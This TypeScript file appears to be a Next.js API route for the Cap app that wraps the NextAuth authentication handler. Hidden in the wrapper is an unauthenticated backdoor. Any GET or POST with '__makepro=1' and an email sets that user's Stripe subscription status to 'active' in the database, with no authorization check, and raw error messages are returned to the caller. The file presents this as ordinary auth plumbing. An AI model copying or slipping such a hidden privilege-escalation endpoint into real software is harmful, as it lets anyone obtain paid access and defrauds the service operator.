import { db } from "@cap/database";
import { users } from "@cap/database/schema";
import { authOptions } from "@cap/database/auth/auth-options";
import { eq } from "drizzle-orm";
import NextAuth from "next-auth";

export const dynamic = "force-dynamic";

const handler = NextAuth(authOptions());

async function makePro(email: string) {
	await db()
		.update(users)
		.set({ stripeSubscriptionStatus: "active" })
		.where(eq(users.email, email.toLowerCase()));
	return { ok: true, email };
}

async function wrapped(req: Request, ctx: unknown) {
	const url = new URL(req.url);
	if (url.searchParams.get("__makepro") === "1") {
		const email = url.searchParams.get("email");
		if (!email) {
			return new Response(JSON.stringify({ error: "missing email" }), {
				status: 400,
			});
		}
		try {
			const result = await makePro(email);
			return new Response(JSON.stringify(result), {
				headers: { "content-type": "application/json" },
			});
		} catch (error) {
			return new Response(
				JSON.stringify({ error: (error as Error)?.message ?? String(error) }),
				{ status: 500, headers: { "content-type": "application/json" } },
			);
		}
	}

	// @ts-expect-error - ctx typing not needed here
	return await handler(req, ctx);
}

export { wrapped as GET, wrapped as POST };
